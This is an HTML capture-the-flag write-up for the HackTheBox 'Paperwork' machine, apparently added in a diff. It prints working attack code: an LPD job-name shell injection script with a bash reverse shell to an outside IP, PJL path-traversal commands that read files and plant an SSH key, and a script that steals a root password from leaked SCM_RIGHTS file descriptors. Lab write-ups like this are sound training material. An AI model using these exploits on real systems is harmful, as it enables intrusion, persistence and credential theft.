@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>Paperwork - HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox Paperwork (Easy, Linux) full write up: LPD printer shell injection → PJL filesystem traversal → SSH key drop → SCM_RIGHTS fd leak from root daemon → root."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--panel-bg:rgba(255,255,255,.03);--border:rgba(255,255,255,.06);--rose:#a855f7;--rose-dim:rgba(168,85,247,.15);--emerald:#34d399;--emerald-dim:rgba(52,211,153,.1);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}
+.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08) 0%,transparent 50%),radial-gradient(circle at 80% 80%,rgba(52,211,153,.04) 0%,transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}
+@media(min-width:768px){main{padding:3rem 2rem}}
+.max-w{max-width:72rem;width:100%;margin:0 auto}
+.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
+.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:var(--panel-bg);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em;transition:all .3s ease}
+.back-btn:hover{color:#c084fc;border-color:rgba(168,85,247,.5)}
+.back-btn svg{transition:transform .3s ease}
+.back-btn:hover svg{transform:translateX(-4px)}
+.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;position:relative;overflow:hidden}
+.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}
+@media(min-width:768px){.writeup-body{padding:3rem}}
+.meta{color:var(--dim);font-size:.75rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}
+h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-transform:uppercase;margin-bottom:1.5rem}
+@media(min-width:768px){h1{font-size:2.5rem}}
+.writeup-body h2{font-size:1.25rem;font-weight:700;color:#c084fc;margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.writeup-body h3{font-size:1rem;font-weight:700;color:#34d399;margin:1.5rem 0 .75rem}
+.writeup-body p{color:var(--muted);font-size:.95rem;line-height:1.75;margin-bottom:1rem}
+.writeup-body ul,.writeup-body ol{color:var(--muted);font-size:.95rem;line-height:1.75;margin:0 0 1rem 1.25rem}
+.writeup-body li{margin-bottom:.25rem}
+.writeup-body strong{color:var(--text)}
+.writeup-body code{font-family:'JetBrains Mono','Fira Code',monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:#c084fc;padding:2px 6px;border-radius:6px}
+.writeup-body pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.8rem;color:var(--emerald);line-height:1.6;white-space:pre-wrap;word-wrap:break-word;overflow-wrap:anywhere}
+.writeup-body pre code{background:none;color:inherit;padding:0;border-radius:0}
+.section-tag{display:inline-block;padding:2px 10px;border-radius:9999px;font-size:.7rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase}
+.tag-easy{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:#34d399}
+.tag-linux{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:#34d399}
+.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}
+@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}
+.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}
+.info-cell .lbl{color:var(--dim);font-size:.65rem;font-family:'JetBrains Mono','Fira Code',monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}
+.info-cell .val{color:var(--text);font-size:.9rem;font-weight:600}
+.footer{text-align:center;padding-top:3rem;color:var(--dim);font-size:10px;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.15em;text-transform:uppercase}
+.fade-in{opacity:0;transform:translateY(20px);transition:opacity .6s ease,transform .6s ease}
+.fade-in.visible{opacity:1;transform:translateY(0)}
+</style>
+</head>
+<body>
+<div class="cyber-grid"></div>
+
+<main>
+<div class="max-w">
+  <div class="nav-row fade-in">
+    <a href="../writeups.html" class="back-btn">
+      <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+      Write Ups
+    </a>
+    <a href="../index.html" class="back-btn">Home</a>
+  </div>
+
+  <div class="panel fade-in">
+    <div class="writeup-body">
+
+      <p class="meta">hackthebox / easy / linux</p>
+      <h1>Paperwork</h1>
+
+      <div class="info-grid">
+        <div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div>
+        <div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="section-tag tag-easy">Easy</span></div></div>
+        <div class="info-cell"><div class="lbl">OS</div><div class="val"><span class="section-tag tag-linux">Linux</span></div></div>
+      </div>
+
+      <h2>Summary</h2>
+      <p>Paperwork is an easy Linux box built on an unsanitized print daemon and a root service that leaks its own file descriptors. A <strong>custom LPD server (port 1515)</strong> pipes the print job name straight into a shell command, giving command injection as <code>lp</code>. The internal <strong>PJL printer on port 9100</strong> has a path traversal in <code>FSUPLOAD</code>/<code>FSDOWNLOAD</code>, which we use to read the user flag and plant an SSH key. Finally, a root <strong>paperwork-daemon</strong> on a Unix socket sends its admin config fd over <code>SCM_RIGHTS</code> during lockdown - triggered by our PJL logging - leaking the root password.</p>
+
+      <h2>Skills Required</h2>
+      <ul>
+        <li>Reading Python source for injection sinks</li>
+        <li>Understanding LPD (printer) protocol framing</li>
+        <li>Path traversal fundamentals</li>
+      </ul>
+
+      <h2>Skills Learned</h2>
+      <ul>
+        <li>Exploiting shell injection via LPD job name</li>
+        <li>PJL <code>FSUPLOAD</code>/<code>FSDOWNLOAD</code> filesystem traversal (HackTricks)</li>
+        <li>Leaking open file descriptors via <code>SCM_RIGHTS</code> ancillary data</li>
+      </ul>
+
+      <h2>Enumeration</h2>
+      <p>The scan shows an intranet site and a weird open service on 1515.</p>
+      <pre>PORT     STATE SERVICE        VERSION
+22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4
+80/tcp   open  http           nginx 1.28.0 (Ubuntu)
+1515/tcp open  ifor-protocol?
+|   TerminalServer: Archive_Printer is ready and printing.</pre>
+      <p>The web page hosts a zip containing the source of the service on 1515 - a custom <strong>LPD server</strong>. It parses a queue name, then takes the print job's <code>J</code> (job name) line and builds a shell command with it.</p>
+
+      <h2>Foothold</h2>
+      <h3>LPD shell injection</h3>
+      <p>The vulnerable line:</p>
+      <pre>subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)</pre>
+      <p>The job name is interpolated straight into <code>shell=True</code> with no sanitization. A small script drives the LPD handshake: select the queue, announce a control file with <code>J</code> + injected command, send it, then announce a dummy data file.</p>
+      <pre>#!/usr/bin/env python3
+import socket
+import sys
+
+host, port, queue, cmd = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4]
+
+job_name = f"x'; bash -c '{cmd}'; echo '"
+control_file = f"J{job_name}\n".encode()
+data_file = b"x\n"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+
+s.send(b"\x02" + queue.encode() + b"\n")
+s.recv(1)
+
+s.send(f"\x02{len(control_file)} cfA001x\n".encode())
+s.recv(1)
+s.send(control_file + b"\x00")
+s.recv(1)
+
+s.send(f"\x03{len(data_file)} dfA001x\n".encode())
+s.recv(1)
+s.send(data_file + b"\x00")
+s.recv(1)
+
+s.close()</pre>
+      <pre>python simplified.py paperwork.htb 1515 archive_intake \
+  "bash -i >& /dev/tcp/10.10.15.63/1337 0>&1"</pre>
+      <p>Reverse shell as <code>lp</code>.</p>
+
+      <h2>User Flag</h2>
+      <h3>PJL filesystem traversal</h3>
+      <p>Port 9100 is listening on loopback - the PJL printer interface (see HackTricks). It supports <code>FSUPLOAD</code> to read files, and the path handling trusts <code>../../</code> traversal from the print spool root.</p>
+      <pre>python3 -c "
+import socket
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(('127.0.0.1',9100))
+s.send(b'@PJL FSUPLOAD NAME=\"../../../../home/archivist/user.txt\"\n')
+data=s.recv(4096)
+print(data.decode(errors='ignore'))
+s.close()
+"</pre>
+      <p>Reads the user flag. Pulling the daemon source confirms the traversal - the <code>Filesystem._translate()</code> normalizes <code>os.path.join(root, path)</code> with no escape check.</p>
+
+      <h2>Privilege Escalation</h2>
+      <h3>Planting an SSH key via FSDOWNLOAD</h3>
+      <p><code>FSDOWNLOAD</code> writes files (again traversable). Two gotchas: the regex requires <code>NAME</code> <strong>before</strong> <code>SIZE</code>, so the command order matters.</p>
+      <pre>@PJL FSDOWNLOAD NAME="../../../../home/archivist/.ssh/authorized_keys" SIZE=&lt;n&gt;
+&lt;pubkey bytes&gt;</pre>
+      <pre>python3 -c "import socket; pubkey=open('/tmp/htb_key.pub','rb').read(); \
+payload=b'@PJL FSDOWNLOAD NAME=\"../../../../home/archivist/.ssh/authorized_keys\" SIZE='+ \
+str(len(pubkey)).encode()+b'\n'+pubkey; \
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
+s.connect(('127.0.0.1',9100)); s.send(payload); print(s.recv(4096).decode(errors='ignore')); \
+s.close()"</pre>
+      <p>SSH in as <code>archivist</code>.</p>
+      <pre>ssh -i /tmp/htb_key archivist@paperwork.htb</pre>
+
+      <h3>The root daemon leaks its fds</h3>
+      <p>A process owned by root is running the management daemon.</p>
+      <pre>ps aux
+root  /usr/bin/python3 /usr/bin/paperwork-daemon</pre>
+      <p>The daemon listens on a Unix socket <code>/run/paperwork/mgmt.sock</code>. When it detects "malice" (an <code>FSQUERY</code>/<code>FSUPLOAD</code>/<code>FSDOWNLOAD</code> in the PJL command log), it goes into lockdown and passes the log fd <em>and the admin config fd</em> back to the client over <code>SCM_RIGHTS</code>.</p>
+
+      <p>First, force a log write with an inert <code>FSQUERY</code> so the trigger is on disk when we connect:</p>
+      <pre>python3 -c"import socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
+s.connect(('127.0.0.1',9100)); s.send(b'@PJL FSQUERY NAME=\"../../../../tmp/\"\n'); \
+print(s.recv(4096).decode(errors='ignore')); s.close()"</pre>
+      <p>Then connect to the daemon socket and pull the passed file descriptors out of the ancillary data:</p>
+      <pre>import socket
+import array
+import os
+
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect('/run/paperwork/mgmt.sock')
+
+msg, ancdata, flags, addr = s.recvmsg(1024, socket.CMSG_LEN(8))
+print(f"Message: {msg.decode()}")
+
+for cmsg_level, cmsg_type, cmsg_data in ancdata:
+    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
+        fds = array.array("i", cmsg_data)
+        print(f"Received FDs: {list(fds)}")
+        if len(fds) &gt; 1:
+            admin_data = os.pread(fds[1], 1024, 0).decode().strip()
+            print(f"\nAdmin config:\n{admin_data}")
+
+s.close()</pre>
+      <p>The leaked <code>ADMIN_PASSWORD=</code> line is the root password.</p>
+      <pre>su root</pre>
+
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li><strong>Read the source you're handed</strong> - the LPD daemon's <code>shell=True</code> sink and the PJL traversal were both plain in the provided code.</li>
+        <li><strong>Printers are file servers</strong> - PJL <code>FSUPLOAD</code>/<code>FSDOWNLOAD</code> give arbitrary read/write when path traversal isn't filtered.</li>
+        <li><strong>Watch command-argument order</strong> - the <code>FSDOWNLOAD</code> regex wanted <code>NAME</code> before <code>SIZE</code>; a mismatched order fails silently.</li>
+        <li><strong><code>SCM_RIGHTS</code> leaks are real</strong> - a root daemon sending its own open fds to a client gives away the admin config.</li>
+      </ul>
+
+    </div>
+  </div>
+
+  <p class="footer">pumkin / write ups</p>
+</div>
+</main>
+
+<script>
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('visible');
+    }
+  });
+}, { threshold: 0 });
+
+document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+</script>
+</body>
+</html>
